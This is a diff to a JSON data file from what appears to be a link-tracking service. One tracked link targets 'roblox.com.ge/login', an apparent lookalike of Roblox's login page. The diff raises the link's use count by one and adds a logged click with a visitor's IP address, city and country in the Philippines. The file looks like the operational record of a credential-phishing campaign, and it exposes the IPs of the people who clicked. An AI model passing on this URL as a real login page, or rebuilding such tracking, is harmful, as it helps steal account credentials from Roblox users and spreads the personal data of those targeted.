@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1205,
+    "useCount": 1206,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9782,6 +9782,14 @@
         "ip": "160.250.73.50",
         "country": "Philippines",
         "city": "Antipolo City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777310648683,
+        "ip": "119.93.69.122",
+        "country": "Philippines",
+        "city": "Makati City",
         "flag": "🇵🇭",
         "countryCode": "PH"
       }
